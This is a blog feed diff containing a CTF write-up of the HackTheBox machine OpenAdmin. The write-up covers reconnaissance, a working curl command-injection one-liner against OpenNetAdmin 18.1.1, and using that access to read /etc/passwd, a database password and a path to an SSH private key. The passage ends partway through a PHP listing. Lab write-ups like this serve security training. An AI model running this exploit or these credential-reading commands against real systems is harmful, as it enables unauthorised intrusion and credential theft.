@@ -1,5 +1,418 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-04-28T08:50:00+02:00</updated><entry><title>Hackpack CTF 2020</title><link href="https://maggick.fr/2020/04/hackpack-ctf-2020.html" rel="alternate"></link><published>2020-04-28T08:50:00+02:00</published><updated>2020-04-28T08:50:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-28:/2020/04/hackpack-ctf-2020.html</id><summary type="html">&lt;p&gt;&lt;img alt="Hackpack CTF logo" class="align-left" src="/media/2020.04/hackpack_logo.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-05-04T14:09:00+02:00</updated><entry><title>HTB: OpenAdmin</title><link href="https://maggick.fr/2020/05/htb-openadmin.html" rel="alternate"></link><published>2020-05-04T14:09:00+02:00</published><updated>2020-05-04T14:09:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-04:/2020/05/htb-openadmin.html</id><summary type="html">&lt;p&gt;&lt;img alt="OpenAdmin card" class="align-left" src="/media/2020.05/openadmin_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/222"&gt;OpenAdmin&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt; and publish on
+January 4, 2020.
+This box is classified as an easy machine. The user part is longer than the root
+part and involve to find a vulnerable component, exploit it to get a shell,
+found the creds of an user able to connect using SSH then found another
+webservice to get the private SSH key of a second user.
+The root part is simply exploiting a sudo permission on &lt;code&gt;nano&lt;/code&gt; to execute command.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.05/openadmin_card.png" alt="OpenAdmin card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/222"&gt;OpenAdmin&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt; and publish on
+January 4, 2020.
+This box is classified as an easy machine. The user part is longer than the root
+part and involve to find a vulnerable component, exploit it to get a shell,
+found the creds of an user able to connect using SSH then found another
+webservice to get the private SSH key of a second user.
+The root part is simply exploiting a sudo permission on &lt;code&gt;nano&lt;/code&gt; to execute command.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Jan  7 03:51:25 2020 as: nmap -sS -p- -oA 10.10.10.171 10.10.10.171&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.171&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.27s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Tue Jan  7 04:23:21 2020 -- 1 IP address (1 host up) scanned in 1915.49 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The landing page is the default Apache page.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="apache default page" src="/media/2020.05/openadmin_1.png"&gt;&lt;/p&gt;
+&lt;p&gt;We run a dirb against it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dirb http://10.10.10.171&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
+&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;START_TIME: Tue Jan  7 04:29:49 2020&lt;/span&gt;
+&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.171/&lt;/span&gt;
+&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.171/ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.171/artwork/&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)&lt;/span&gt;
+&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.171/music/&lt;/span&gt;
+&lt;span class="code-line"&gt;+ http://10.10.10.171/server-status (CODE:403|SIZE:277)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The artwork directory is a rabbit hole (there is no dynamic code even for the
+contact page) but it was found first by dirb.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Artwork page" src="/media/2020.05/openadmin_2.png"&gt;&lt;/p&gt;
+&lt;p&gt;The music directory offer a login page which redirect us to the ona webpage.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Music page" src="/media/2020.05/openadmin_3.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Music page" src="/media/2020.05/openadmin_4.png"&gt;&lt;/p&gt;
+&lt;h2 id="openadmin"&gt;OpenAdmin&lt;/h2&gt;
+&lt;p&gt;We can see on the ona (opennetadmin) that the version is the 18.1.1 which is not
+the latest. Using searchsploit we found a exploit for this specific version.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;searchsploit opennetadmin&lt;/span&gt;
+&lt;span class="code-line"&gt;------------------------ ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt; Exploit Title          |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;                        | (/usr/share/exploitdb/)&lt;/span&gt;
+&lt;span class="code-line"&gt;------------------------ ----------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;OpenNetAdmin 13.03.01 - | exploits/php/webapps/26682.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;OpenNetAdmin 18.1.1 - R | exploits/php/webapps/47691.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;------------------------ ------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The script was not working out of the box for me so I "rewrote" it (it is a
+oneliner in bash).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;curl --silent -d &lt;span class="s2"&gt;&amp;quot;xajax=window_submit&amp;amp;xajaxr=1574117726710&amp;amp;xajaxargs[]=tooltips&amp;amp;xajaxargs[]=ip%3D%3E;echo \&amp;quot;BEGIN\&amp;quot;;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CMD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;;echo \&amp;quot;END\&amp;quot;&amp;amp;xajaxargs[]=ping&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://10.10.10.171/ona/&amp;quot;&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; sed -n -e &lt;span class="s1"&gt;&amp;#39;/BEGIN/,/END/ p&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We start enumerating the box as &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;whoami&amp;#39; &lt;/span&gt;
+&lt;span class="code-line"&gt;                  &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
+&lt;span class="code-line"&gt;  www-data&lt;/span&gt;
+&lt;span class="code-line"&gt;  END&lt;/span&gt;
+&lt;span class="code-line"&gt;sh ona_rce.sh &amp;#39;ls -al&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
+&lt;span class="code-line"&gt;total 72&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x 10 www-data www-data 4096 Jan  7 14:41 .&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ..&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php&lt;/span&gt;
+&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We notice that the file are from January 2018. So we just filter on file older
+that 30 days. That allow us to find a configuration file for the database
+containing a password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;find ../../ -mtime -30 2&amp;gt;/dev/null | grep -Ev &amp;quot;^/proc&amp;quot;&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
+&lt;span class="code-line"&gt;../../&lt;/span&gt;
+&lt;span class="code-line"&gt;../../priv.save&lt;/span&gt;
+&lt;span class="code-line"&gt;../../ona/www&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;sh ona_rce.sh &amp;#39;cat ../../ona/www/local/config/database_settings.inc.php&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;$ona_contexts=array (&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;#39;DEFAULT&amp;#39; =&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  array (&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;#39;databases&amp;#39; =&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    array (&lt;/span&gt;
+&lt;span class="code-line"&gt;      0 =&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      array (&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;#39;db_type&amp;#39; =&amp;gt; &amp;#39;mysqli&amp;#39;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;#39;db_host&amp;#39; =&amp;gt; &amp;#39;localhost&amp;#39;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;#39;db_login&amp;#39; =&amp;gt; &amp;#39;ona_sys&amp;#39;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;#39;db_passwd&amp;#39; =&amp;gt; &amp;#39;n1nj4W4rri0R!&amp;#39;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;#39;db_database&amp;#39; =&amp;gt; &amp;#39;ona_default&amp;#39;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;#39;db_debug&amp;#39; =&amp;gt; false,&lt;/span&gt;
+&lt;span class="code-line"&gt;      ),&lt;/span&gt;
+&lt;span class="code-line"&gt;    ),&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;#39;description&amp;#39; =&amp;gt; &amp;#39;Default data context&amp;#39;,&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;#39;context_color&amp;#39; =&amp;gt; &amp;#39;#D3DBFF&amp;#39;,&lt;/span&gt;
+&lt;span class="code-line"&gt;  ),&lt;/span&gt;
+&lt;span class="code-line"&gt;);&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;?&amp;gt;END&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We want to try this password against SSH users but we don't know them. We can
+just cat &lt;code&gt;/etc/passwd&lt;/code&gt; to get a list of the system's user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;cat /etc/passwd&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
+&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
+&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;joanna:x:1001:1001:,,,:/home/joanna:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;I tried to logged as &lt;code&gt;joanna&lt;/code&gt; first but the password was &lt;code&gt;jimmy&lt;/code&gt;'s.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh jimmy@10.10.10.171&lt;/span&gt;
+&lt;span class="code-line"&gt;jimmy@openadmin:~$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="internal"&gt;Internal&lt;/h2&gt;
+&lt;p&gt;We notice that we are part of the &lt;code&gt;internal&lt;/code&gt; group. Therefore we look for files
+belonging to this specific group and found some "internal" directory containing
+three PHP script.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:~$ find / -group internal 2&amp;gt; /dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;/var/www/internal&lt;/span&gt;
+&lt;span class="code-line"&gt;/var/www/internal/main.php&lt;/span&gt;
+&lt;span class="code-line"&gt;/var/www/internal/logout.php&lt;/span&gt;
+&lt;span class="code-line"&gt;/var/www/internal/index.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;main.php:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: /index.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Open Admin Trusted&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# OpenAdmin&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cat /home/joanna/.ssh/id_rsa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;$output&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;h3&amp;gt;Don&amp;#39;t forget your &amp;quot;ninja&amp;quot; password&amp;lt;/h3&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;Click here to logout &amp;lt;a href=&amp;quot;logout.php&amp;quot; tite = &amp;quot;Logout&amp;quot;&amp;gt;Session&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;index.php&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;ob_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;// error_reporting(E_ALL);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;// ini_set(&amp;quot;display_errors&amp;quot;, 1);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;html lang = &amp;quot;en&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;title&amp;gt;Tutorialspoint.com&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;link href = &amp;quot;css/bootstrap.min.css&amp;quot; rel = &amp;quot;stylesheet&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;h2&amp;gt;Enter Username and Password&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;div class = &amp;quot;container form-signin&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;h2 class=&amp;quot;featurette-heading&amp;quot;&amp;gt;Login Restricted.&amp;lt;span class=&amp;quot;text-muted&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="x"&gt;          &lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
